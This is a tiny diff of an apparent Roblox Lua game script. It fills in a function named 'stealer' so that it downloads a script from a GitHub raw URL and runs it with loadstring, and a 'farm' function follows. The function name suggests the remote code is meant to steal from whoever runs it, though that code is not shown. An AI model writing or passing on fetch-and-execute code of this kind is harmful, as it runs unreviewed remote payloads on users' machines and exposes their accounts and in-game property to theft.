@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet(''))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Voidhubteam/Pets-go-script/refs/heads/main/beastmodev5.txt'))()
 end
 
 local function farm()
